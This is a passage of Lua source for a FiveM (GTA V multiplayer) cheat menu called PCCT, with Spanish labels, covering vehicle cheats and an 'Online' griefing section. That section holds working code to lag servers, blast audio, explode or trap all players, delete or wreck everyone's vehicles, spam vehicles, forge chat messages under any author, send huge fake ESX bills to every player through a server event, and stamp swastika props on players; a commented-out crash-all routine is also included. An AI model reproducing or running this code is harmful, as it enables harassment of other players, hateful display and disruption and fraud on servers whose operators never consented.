                if cur_ammo < max_ammo and max_ammo > 0 then

                    PCCT:GetFunction("SetAmmoInClip")(PCCT.LocalPlayer, curWep, max_ammo)

                end

            end



            local ret, max = PCCT:GetFunction("GetMaxAmmo")(PCCT.LocalPlayer, curWep)



            if ret then

                PCCT:GetFunction("SetPedAmmo")(PCCT.LocalPlayer, curWep, max)

            end

        end



        curY = curY + 25

    end)



    PCCT:AddCategory("Vehiculo", function(self, x, y)

        local curY = 5



        if self.Painter:CheckBox("Vehiculo Modo Dios", self.Config.Vehicle.GodMode, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "vehicle_god_mode") then

            self.Config.Vehicle.GodMode = not self.Config.Vehicle.GodMode

        end



        curY = curY + 25



        if self.Painter:CheckBox("NEUMATICOS ANTIBALAS", self.Config.Vehicle.BulletProofTires, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "bulletproof_enabled") then

            self.Config.Vehicle.BulletProofTires = not self.Config.Vehicle.BulletProofTires

        end



        curY = curY + 25



        if self.Painter:CheckBox("MODO SPIDERMAN", self.Config.Vehicle.Wallride, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "wallride_enabled") then

            self.Config.Vehicle.Wallride = not self.Config.Vehicle.Wallride

        end



        curY = curY + 20



        if self.Painter:Button("LSC", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "do_lsc_menu") then

            self:DoLSC(true)

        end



        curY = curY + 25



        if self.Painter:Button("BORRAR VEHICULO", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "delete_self_vehicle") then

            local veh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)



            if not self:GetFunction("DoesEntityExist")(veh) then

                self:AddNotification("ERROR", "Nesecitas estar en un vehiculo!")

            else

                CreateThread(function()

                    self:AddNotification("EXITO", "Borrando vehiculo.", 5000)



                    if self.Util:DeleteEntity(veh) then

                        self:AddNotification("EXITO", "Borrado!", 5000)

                    end

                end)

            end

        end



        curY = curY + 25
        


        if self.Painter:Button("RELLENAR GASOFA", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "full_veh_tank") then

            local veh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)



            if not self:GetFunction("DoesEntityExist")(veh) then

                self:AddNotification("ERROR", "Nesecitas estar en un vehiculo!")

            else

                CreateThread(function()

                    self:AddNotification("EXITO", "Rellenando tanque.", 5000)


                    if GetVehicleFuelLevel(veh) <= 50.0 then
                        SetVehicleFuelLevel(veh, math.random(7500, 10000) / 100)
                    end

                end)

            end

        end



        curY = curY + 25



        if self.Painter:Button("SACAR VEHICULO", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "spawn_self_vehicle") then

            local modelName = self:GetTextInput("Pon el nombre", "", 20)



            if modelName ~= "" and self:GetFunction("IsModelValid")(modelName) and self:GetFunction("IsModelAVehicle")(modelName) then

                self:SpawnLocalVehicle(modelName, false, true)

                self:AddNotification("EXITO", "Vehiculo sacado " .. modelName, 10000)

            else

                self:AddNotification("ERROR", "No es un modelo valido.", 10000)

            end

        end



        curY = curY + 25



        if self.Painter:Button("REPARAR VEHICULO", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "repair_vehicle") then

            local veh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer, false)

            if not self:GetFunction("DoesEntityExist")(veh) then return self:AddNotification("ERROR", "Nesecitas estar en un vehiculo!") end

            self:RepairVehicle(veh)

            self:AddNotification("EXITO", "Vehiculo reparado!", 10000)

        end



        curY = curY + 25



        if self.Painter:Button("VOLTEAR COCHE", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "flip_vehicle") then

            local veh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer, false)

            if not self:GetFunction("DoesEntityExist")(veh) then return self:AddNotification("ERROR", "Nesecitas estar en un vehiculo!") end

            self:GetFunction("SetVehicleOnGroundProperly")(veh)

            self:AddNotification("EXITO", "Coche volteado!", 10000)

        end



        curY = curY + 25



        if self.Painter:Button("MEJORAS DE MOTOR", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "max_out_vehicle") then

            local veh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer, false)

            self:GetFunction("SetVehicleModKit")(veh, 0)

            self:GetFunction("SetVehicleMod")(veh, 11, self:GetFunction("GetNumVehicleMods")(veh, 11) - 1, false)

            self:GetFunction("SetVehicleMod")(veh, 12, self:GetFunction("GetNumVehicleMods")(veh, 12) - 1, false)

            self:GetFunction("SetVehicleMod")(veh, 13, self:GetFunction("GetNumVehicleMods")(veh, 13) - 1, false)

            self:GetFunction("SetVehicleMod")(veh, 15, self:GetFunction("GetNumVehicleMods")(veh, 15) - 2, false)

            self:GetFunction("SetVehicleMod")(veh, 16, self:GetFunction("GetNumVehicleMods")(veh, 16) - 1, false)

            self:GetFunction("ToggleVehicleMod")(veh, 17, true)

            self:GetFunction("ToggleVehicleMod")(veh, 18, true)

            self:GetFunction("ToggleVehicleMod")(veh, 19, true)

            self:GetFunction("ToggleVehicleMod")(veh, 21, true)

            self:AddNotification("EXITO", "Mejorado!.", 10000)

        end



        curY = curY + 25



        if self.Painter:ListChoice("NITRO MOTOR: ", boost_options, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "vehicle_boost", self:IndexOf(boost_options, picho.tostring(self.Config.Vehicle.Boost + 0.0))) then

            self.Config.Vehicle.Boost = picho.tonumber(boost_options[list_choices["vehicle_boost"].selected])

        end



        curY = curY + 25



        if self.Painter:Button("DESBLOQUEAR COCHE CERCANO", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "unlock_closest_vehicle") then

            local closestVeh = self:GetClosestVehicle()

            if not self:GetFunction("DoesEntityExist")(closestVeh) then return self:AddNotification("ERROR", "No vehicle!") end

            self:AddNotification("INFO", "Desbloqueando coche.", 5000)

            self:UnlockVehicle(closestVeh)

        end



        curY = curY + 25



        if self.Painter:Button("BLOQUEAR COCHE CERCANO", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "lock_closest_vehicle") then

            local closestVeh = self:GetClosestVehicle()

            if not self:GetFunction("DoesEntityExist")(closestVeh) then return self:AddNotification("ERROR", "No vehicle!") end

            self:AddNotification("INFO", "Bloqueando.", 5000)

            self:UnlockVehicle(closestVeh, true)

        end



        curY = curY + 25



        if self.Painter:Button("ROMPER COCHE CERCANO", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "disable_closest_vehicle") then

            local closestVeh = self:GetClosestVehicle()

            if not self:GetFunction("DoesEntityExist")(closestVeh) then return self:AddNotification("ERROR", "No vehicle!") end

            self:DisableVehicle(closestVeh)

        end



        curY = curY + 25



        if self.Painter:Button("BORRAR COCHE CERCANO", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "delete_closest_vehicle") then

            local closestVeh = self:GetClosestVehicle()

            if not self:GetFunction("DoesEntityExist")(closestVeh) then return self:AddNotification("ERROR", "No vehicle!") end

            self.Util:DeleteEntity(closestVeh)

        end



        curY = curY + 25



        if self.Painter:Button("TP AL COCHE MAS CERCANO (SHIFT PARA CONDUCIR)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "tp_into_closest_vehicle") then

            local closestVeh = self:GetClosestVehicle()

            if not self:GetFunction("DoesEntityExist")(closestVeh) then return self:AddNotification("ERROR", "No vehicle!") end

            local seat = 0



            if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then

                self:KickOutAllPassengers(closestVeh, -1)

                seat = -1

            end



            self:GetFunction("TaskWarpPedIntoVehicle")(self.LocalPlayer, closestVeh, seat)

            self:AddNotification("EXITO", "TP exitoso", 5000)

        end

    end)



    local spamming_command



    PCCT:AddCategory("Online (~r~RIESGO~w~)", function(self, x, y, w, h)

        local curY = 5



        if self.Painter:CheckBox("INCLUIRTE", self.Config.OnlineIncludeSelf, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "online_include_self") then

            self.Config.OnlineIncludeSelf = not self.Config.OnlineIncludeSelf

        end



        curY = curY + 25



        if self.Painter:CheckBox("LAGEAR SERVER(~b~TESTEO~w~)", _use_lag_server, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "lag_server_out") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                _use_lag_server = not _use_lag_server

                self:LaggingServer()



                if _use_lag_server then

                    self:AddNotification("INFO", "Lageando server!", 10000)

                else

                    self:AddNotification("INFO", "Parando de lagear.", 10000)

                end

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("EARRAPE SERVER(~b~TESTEO~w~)", _use_earrape_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "earrape_server") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                _use_earrape_loop = not _use_earrape_loop

                self:EarrapeServer()



                if _use_earrape_loop then

                    self:AddNotification("INFO", "Earrape server (Unstopable!!)", 10000)

                else

                    self:AddNotification("INFO", "Es imparable al 100% !!", 10000)

                end

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("LOOP DE HIDRANTES", _use_hydrant_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "hydrant_loop_all") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                _use_hydrant_loop = not _use_hydrant_loop

                self:HydrantLoop()



                if _use_hydrant_loop then

                    self:AddNotification("INFO", "Agua para todos!", 10000)

                else

                    self:AddNotification("INFO", "Parando el agua.", 10000)

                end

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("LOOP DE FUEGO(~b~TESTEO~w~)", _use_fire_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "fire_loop_all") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                _use_fire_loop = not _use_fire_loop

                self:FireLoop()



                if _use_fire_loop then

                    self:AddNotification("INFO", "Fuego para todos!", 10000)

                else

                    self:AddNotification("INFO", "Parando fuego.", 10000)

                end

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("BORRAR COCHES LOOP", _use_delete_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "delete_all_vehicles_loop") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                _use_delete_loop = not _use_delete_loop

                self:DeleteLoop()



                if _use_delete_loop then

                    self:AddNotification("INFO", "No mas carros!", 10000)

                else

                    self:AddNotification("INFO", "Parando borrado.", 10000)

                end

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("EXPLOTAR COCHES LOOP(~r~RIESGO~w~)", _use_explode_vehicle_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "explode_vehicles_loop") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                _use_explode_vehicle_loop = not _use_explode_vehicle_loop

                self:ExplodeVehicleLoop()



                if _use_explode_vehicle_loop then

                    self:AddNotification("INFO", "Explosiones para todos!", 10000)

                else

                    self:AddNotification("INFO", "Parando explosiones.", 10000)

                end

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("EXPLOTAR JUGADORES LOOP(~r~RIESGO~w~)", _use_explode_player_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "explode_player_loop") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                _use_explode_player_loop = not _use_explode_player_loop

                self:ExplodePlayerLoop()



                if _use_explode_player_loop then

                    self:AddNotification("INFO", "ISIS para todos!", 10000)

                else

                    self:AddNotification("INFO", "Parando explosiones.", 10000)

                end

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("LANZAR VEHICULOS LOOP(~b~TESTEO~w~)", _use_launch_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "_use_launch_loop") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

            else

                _use_launch_loop = not _use_launch_loop

                self:LaunchLoop()



                if _use_launch_loop then

                    self:AddNotification("INFO", "Tiempo de ir al espacio!", 10000)

                else

                    self:AddNotification("INFO", "Parando de lanzar.", 10000)

                end

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("ROMPER COCHES LOOP(~b~TESTEO~w~)", _disable_vehicle_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "_disable_vehicle_loop") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                _disable_vehicle_loop = not _disable_vehicle_loop

                self:DisableLoop()



                if _disable_vehicle_loop then

                    self:AddNotification("INFO", "No mas conductores!", 10000)

                else

                    self:AddNotification("INFO", "Parando.", 10000)

                end

            end

        end



        curY = curY + 20



        if resource_list["esx_billing"] then

            if self.Painter:Button("Poner Multas ~g~ESX ~w~(~g~Safe~w~)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_billing") then

                for i, v in pairs(GetActivePlayers()) do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(v), 'Purposeless', ('New Menu Gen On Top'), 999999786)

                end

            end



            curY = curY + 25

        end



        if self.Painter:Button("EXPLOTAR A TODOS(~r~RIESGO~w~)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "explode_everyone") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                CreateThread(function()

                    local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)



                    for id, src in picho.pairs(self.PlayerCache) do

                        src = picho.tonumber(src)



                        if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then

                            self:GetFunction("AddExplosion")(self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(src), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)

                        end

                    end

                end)



                self:AddNotification("INFO", "ISIS entraron a la ciudad!", 10000)

            end

        end



        curY = curY + 25



        if self.Painter:Button("TODOS LOS CARROS RAMPAS(~p~POSIBLE RIESGO ~w~(~y~AC~w~)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "ramp_all_cars") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)



                CreateThread(function()

                    self:RequestModelSync("stt_prop_stunt_track_dwslope30")



                    for vehicle in self:EnumerateVehicles() do

                        if vehicle ~= _veh or self.Config.OnlineIncludeSelf then

                            local ramp = self:GetFunction("CreateObject")(self:GetFunction("GetHashKey")("stt_prop_stunt_track_dwslope30"), 0, 0, 0, true, true, true)

                            self:DoNetwork(ramp)

                            self:GetFunction("NetworkRequestControlOfEntity")(vehicle)

                            self:RequestControlOnce(vehicle)

                            self:RequestControlOnce(ramp)



                            if self:GetFunction("DoesEntityExist")(vehicle) then

                                self:GetFunction("AttachEntityToEntity")(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)

                            end

                        end



                        Wait(50)

                    end

                end)



                self:AddNotification("INFO", "Todos son rampas!", 10000)

            end

        end



        curY = curY + 25



        if self.Painter:Button("COCHES EDIFICIOS DEL FBI(~p~POSIBLE RIESGO ~w~(~y~AC~w~)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "fib_all_cars") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)



                CreateThread(function()

                    for vehicle in self:EnumerateVehicles() do

                        if vehicle ~= _veh or self.Config.OnlineIncludeSelf then

                            local building = self:GetFunction("CreateObject")(-1404869155, 0, 0, 0, true, true, true)

                            self:DoNetwork(ramp)

                            self:GetFunction("NetworkRequestControlOfEntity")(vehicle)

                            self:RequestControlOnce(vehicle)

                            self:RequestControlOnce(building)



                            if self:GetFunction("DoesEntityExist")(vehicle) then

                                self:GetFunction("AttachEntityToEntity")(building, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)

                            end

                        end



                        Wait(50)

                    end

                end)



                self:AddNotification("INFO", "Todos los carros son edificios!", 10000)

            end

        end



        curY = curY + 25



        if self.Painter:Button("BORRAR COCHES", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "delete_all_vehicles") then

            self:AddNotification("INFO", "Borrando coches!", 10000)

            self:DeleteVehicles()

        end



        curY = curY + 25



        if self.Painter:Button("SPAMEAR VEHICULOS", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "vehicle_spam_server") then

            self:CarSpamServer()



            if not self.Config.SafeMode then

                self:AddNotification("INFO", "Vehiculos ilimitados!", 10000)

            end

        end



        curY = curY + 25



        if self.Painter:Button("PONER SIMBOLOS A TODOS(~p~POSIBLE RIESGO ~w~(~y~AC~w~)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "swastika_all") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                CreateThread(function()

                    for id, src in picho.pairs(self.PlayerCache) do

                        src = picho.tonumber(src)



                        if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then

                            local ped = self:GetFunction("GetPlayerPed")(src)



                            if self:GetFunction("DoesEntityExist")(ped) then

                                self.FreeCam.SpawnerOptions["PREMADE"]["SWASTIKA"](self:GetFunction("IsPedInAnyVehicle")(ped) and self:GetFunction("GetVehiclePedIsIn")(ped) or ped)

                                Wait(1000)

                            end

                        end

                    end

                end)



                self:AddNotification("INFO", "Simbolos a todos!", 10000)

            end

        end



        curY = curY + 25



        if self.Painter:Button("ENCERRAR A TODOS", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "gas_all") then

            if self.Config.SafeMode then

                return self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desabilitalo.")

            else

                CreateThread(function()

                    for id, src in picho.pairs(self.PlayerCache) do

                        src = picho.tonumber(src)



                        if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then

                            local ped = self:GetFunction("GetPlayerPed")(src)



                            if self:GetFunction("DoesEntityExist")(ped) then

                                self:GasPlayer(src)

                                Wait(1000)

                            end

                        end

                    end

                end)



                self:AddNotification("INFO", "Todos encerrados!", 10000)

            end

        end



        curY = curY + 25

        -- if self.Painter:Button("~r~CRASH ALL (SHIFT FOR METHOD)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "crash_all") then

        -- 	if self.Config.SafeMode then

        -- 		return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

        -- 	else

        -- 		local method = nil

        -- 		if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then

        -- 			local _method = self:GetTextInput("Enter crash method. [object / ped / both]", "both", 10)

        -- 			if _method then

        -- 				method = _method

        -- 				self:AddNotification("INFO", "Using " .. method .. " crash method.")

        -- 			end

        -- 		end

        -- 		CreateThread(function()

        -- 			for id, src in picho.pairs(self.PlayerCache) do

        -- 				src = picho.tonumber(src)

        -- 				if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then

        -- 					local ped = self:GetFunction("GetPlayerPed")(src)

        -- 					if self:GetFunction("DoesEntityExist")(ped) then

        -- 						self:CrashPlayer(src, true, method)

        -- 						Wait(500)

        -- 					end

        -- 				end

        -- 			end

        -- 		end)

        -- 		self:AddNotification("INFO", "Crashing all players!", 10000)

        -- 	end

        -- end

        curY = 5

        local _w = (self.Painter:GetTextWidth("SACAR PROPS (SHIFT PARA PEGARLOS)", 4, 0.37)) + 2



        if self.Painter:Button("SPAWNEAR PROPS (SHIFT PARA PEGARLOS", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "spawn_prop_on_all") then

            self:DoSpawnObjectUI(nil, true)

        end



        curY = curY + 25

        local _w = (self.Painter:GetTextWidth("SPAMEAR COMANDOS (SHIFT PARA LOOP)", 4, 0.37)) + 2



        if self.Painter:Button("SPAMEAR COMANDOS (SHIFT PARA LOOP)", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "spam_command") then

            spamming_command = false



            if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then

                local cmd = self:GetTextInput("Pon el comando.", "", 500)



                if cmd then

                    local delay = self:GetTextInput("Pon el delay en ms.", 100, 10)



                    if delay and picho.tonumber(delay) then

                        local wait = picho.tonumber(delay)

                        spamming_command = true



                        CreateThread(function()

                            while self.Enabled do

                                if not spamming_command then break end

                                self:GetFunction("EjecutarComando")(cmd)

                                Wait(wait)

                            end

                        end)



                        self:AddNotification("EXITO", "Spammeando.", 10000)

                    else

                        self:AddNotification("INFO", "Cancelado.", 5000)

                    end

                else

                    self:AddNotification("INFO", "Cancelado.", 5000)

                end

            else

                local cmd = self:GetTextInput("Pon El comando.", "", 500)



                if cmd then

                    local times = self:GetTextInput("Repeticiones?.", 1, 10)



                    if times and picho.tonumber(times) then

                        local repetitions = picho.tonumber(times)

                        local delay = self:GetTextInput("Pon el delay en ms.", 100, 10)



                        if delay and picho.tonumber(delay) then

                            local wait = picho.tonumber(delay)

                            spamming_command = true



                            CreateThread(function()

                                local repetition = 0



                                while repetition < repetitions do

                                    repetition = repetition + 1

                                    self:GetFunction("EjecutarComando")(cmd)

                                    Wait(wait)

                                end

                            end)



                            self:AddNotification("EXITO", "Spameando.", 10000)

                        else

                            self:AddNotification("INFO", "Cancelado.", 5000)

                        end

                    else

                        self:AddNotification("INFO", "Cancelado.", 5000)

                    end

                else

                    self:AddNotification("INFO", "Cancelado.", 5000)

                end

            end

        end



        curY = curY + 25



        if self.DynamicTriggers["chat"] and self.DynamicTriggers["chat"]["_chat:messageEntered"] then

            local _w = (self.Painter:GetTextWidth("MENSAJE DEL CHAT (SHIFT PARA MULTIPLE)", 4, 0.37)) + 2



            if self.Painter:Button("MENSAJE DEL CHAT (SHIFT PARA MULTIPLE)", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "send_message") then

                local count = 1

                local msg = self:GetTextInput("Pon el mensaje.", "", 500)



                if msg then

                    local author = self:GetTextInput("Pon el autor.", "", 500)



                    if author then

                        if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then

                            local times = self:GetTextInput("Pon repeticiones.", count, 10)



                            if times and picho.tonumber(times) then

                                count = times

                            end

                        end



                        for i = 1, count do

                            self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["chat"]["_chat:messageEntered"], author, {0, 0x99, 255}, msg)

                        end

                    else

                        self:AddNotification("INFO", "Cancelled.", 5000)

                    end

                else

                    self:AddNotification("INFO", "Cancelled.", 5000)

                end

            end



            curY = curY + 25

        end

    end)



    local was_godmode

    local was_boosted

    local was_dmg_boost



    function PCCT:DoVehicleRelated()

        local curVeh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)

        if not self:GetFunction("DoesEntityExist")(curVeh) or self:GetFunction("GetPedInVehicleSeat")(curVeh, -1) ~= self.LocalPlayer then return end



        if self.Config.Vehicle.BulletProofTires then

            self:GetFunction("SetVehicleTyresCanBurst")(curVeh, false)

            was_bulletproof = true

        elseif was_bulletproof then

            self:GetFunction("SetVehicleTyresCanBurst")(curVeh, true)

            was_bulletproof = false

        end



        if self.Config.Vehicle.GodMode then

            self:GetFunction("SetEntityInvincible")(curVeh, true)



            if self:GetFunction("IsVehicleDamaged")(curVeh) then

                self:GetFunction("SetVehicleFixed")(curVeh)

            end



            was_godmode = true

        elseif was_godmode then

            self:GetFunction("SetEntityInvincible")(curVeh, false)

            was_godmode = false

        end



        if self.Config.Vehicle.Wallride then

            self:GetFunction("ApplyForceToEntity")(curVeh, 1, 0, 0, -0.4, 0, 0, 0, 1, true, true, true, true, true)

        end



        if self.Config.Vehicle.Boost > 1.0 then

            self:GetFunction("SetVehicleEnginePowerMultiplier")(curVeh, self.Config.Vehicle.Boost + 1.0)

            was_boosted = true

        elseif was_boosted then

            self:GetFunction("SetVehicleEnginePowerMultiplier")(curVeh, 1.0)

            was_boosted = false

        end



        if self.Config.Weapon.DamageBoost > 1.0 then

            self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, self.Config.Weapon.DamageBoost)

            was_dmg_boost = true

        elseif was_dmg_boost then

            self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 1.0)

            was_dmg_boost = false

        end

    end



    function PCCT:GetRainbow(freq)

        local cur = self:GetFunction("GetGameTimer")() / 1000

        local r = picho.math.floor(picho.math.sin(cur * freq + 0) * 127 + 128)

        local g = picho.math.floor(picho.math.sin(cur * freq + 2) * 127 + 128)

        local b = picho.math.floor(picho.math.sin(cur * freq + 4) * 127 + 128)



        return r, g, b

    end



    local rainbow_paint, rainbow_neon



    local LSC_Menu = {

        ["Paint"] = {

            {

                Name = "Rainbow",

                Get = function(veh) return rainbow_paint == veh and "~g~ON" or "~r~OFF" end,

                Set = function(veh)

                    if rainbow_paint then

                        rainbow_paint = nil



                        return

                    else

                        rainbow_paint = veh

                    end



                    CreateThread(function()

                        while rainbow_paint and PCCT.Enabled do

                            local r, g, b = PCCT:GetRainbow(1)

                            PCCT:GetFunction("SetVehicleCustomPrimaryColour")(rainbow_paint, r, g, b)

                            PCCT:GetFunction("SetVehicleCustomSecondaryColour")(rainbow_paint, r, g, b)

                            Wait(0)

                        end

                    end)

                end

            },

            {

                Name = "Primary",

                Get = function(veh)

                    local r, g, b = PCCT:GetFunction("GetVehicleCustomPrimaryColour")(veh)



                    if not r then

                        r = 255

                    end



                    if not g then

                        g = 255

                    end



                    if not b then

                        b = 255

                    end



                    return picho.tostring(r) .. " " .. picho.tostring(g) .. " " .. picho.tostring(b)

                end,

                Set = function(veh)

                    local r, g, b = PCCT:GetFunction("GetVehicleCustomPrimaryColour")(veh)



                    if not r then

                        r = 255

                    end



                    if not g then

                        g = 255

                    end



                    if not b then

                        b = 255

                    end



                    local r = PCCT:GetTextInput("Enter red value.", r, 3)



                    if not r or r == "" or not tonumber(r) then

                        PCCT:AddNotification("ERROR", "Invalid red value.", 5000)

                    else

                        local g = PCCT:GetTextInput("Enter green value.", g, 3)



                        if not g or g == "" or not tonumber(g) then

                            PCCT:AddNotification("ERROR", "Invalid green value.", 5000)

                        else

                            local b = PCCT:GetTextInput("Enter blue value.", b, 3)



                            if not b or b == "" or not tonumber(b) then

                                PCCT:AddNotification("ERROR", "Invalid blue value.", 5000)

                            else

                                r = PCCT:Clamp(tonumber(r), 0, 255)

                                g = PCCT:Clamp(tonumber(g), 0, 255)

                                b = PCCT:Clamp(tonumber(b), 0, 255)

                                PCCT:GetFunction("SetVehicleCustomPrimaryColour")(veh, r, g, b)

                            end

                        end

                    end

                end

            },

            {

                Name = "Secondary",

                Get = function(veh)

                    local r, g, b = PCCT:GetFunction("GetVehicleCustomPrimaryColour")(veh)



                    if not r then

                        r = 255

                    end



                    if not g then

                        g = 255

                    end



                    if not b then

                        b = 255

                    end



                    return picho.tostring(r) .. " " .. picho.tostring(g) .. " " .. picho.tostring(b)

                end,

                Set = function(veh)

                    local r, g, b = PCCT:GetFunction("GetVehicleCustomPrimaryColour")(veh)



                    if not r then

                        r = 255

                    end



                    if not g then

                        g = 255

                    end



                    if not b then

                        b = 255

                    end



                    local r = PCCT:GetTextInput("Enter red value.", r, 3)



                    if not r or r == "" or not tonumber(r) then

                        PCCT:AddNotification("ERROR", "Invalid red value.", 5000)

                    else

                        local g = PCCT:GetTextInput("Enter green value.", g, 3)



                        if not g or g == "" or not tonumber(g) then

                            PCCT:AddNotification("ERROR", "Invalid green value.", 5000)

                        else

                            local b = PCCT:GetTextInput("Enter blue value.", b, 3)



                            if not b or b == "" or not tonumber(b) then

                                PCCT:AddNotification("ERROR", "Invalid blue value.", 5000)

                            else

                                r = PCCT:Clamp(tonumber(r), 0, 255)

                                g = PCCT:Clamp(tonumber(g), 0, 255)

                                b = PCCT:Clamp(tonumber(b), 0, 255)

                                PCCT:GetFunction("SetVehicleCustomSecondaryColour")(veh, r, g, b)

                            end

                        end

                    end

                end

            }

        },

        ["Lights"] = {

            {

                Name = "Rainbow Neon",

                Get = function(veh) return rainbow_neon == veh and "~g~ON" or "~r~OFF" end,

                Set = function(veh)

                    if rainbow_neon then

                        rainbow_neon = nil



                        return

                    else

                        rainbow_neon = veh

                    end



                    CreateThread(function()

                        while rainbow_neon and PCCT.Enabled do

                            local r, g, b = PCCT:GetRainbow(1)

                            PCCT:GetFunction("SetVehicleNeonLightsColour")(rainbow_neon, r, g, b)

                            Wait(0)

                        end

                    end)

                end

            },

            {

                Name = "Neon Color",

                Get = function(veh)

                    local r, g, b = PCCT:GetFunction("GetVehicleNeonLightsColour")(veh)



                    if not r then

                        r = 255

                    end



                    if not g then

                        g = 255

                    end



                    if not b then

                        b = 255

                    end



                    return picho.tostring(r) .. " " .. picho.tostring(g) .. " " .. picho.tostring(b)

                end,

                Set = function(veh)

                    local r, g, b = PCCT:GetFunction("GetVehicleNeonLightsColour")(veh)



                    if not r then

                        r = 255

                    end



                    if not g then

                        g = 255

                    end



                    if not b then

                        b = 255

                    end



                    local r = PCCT:GetTextInput("Enter red value.", r, 3)



                    if not r or r == "" or not tonumber(r) then

                        PCCT:AddNotification("ERROR", "Invalid red value.", 5000)

                    else

                        local g = PCCT:GetTextInput("Enter green value.", g, 3)



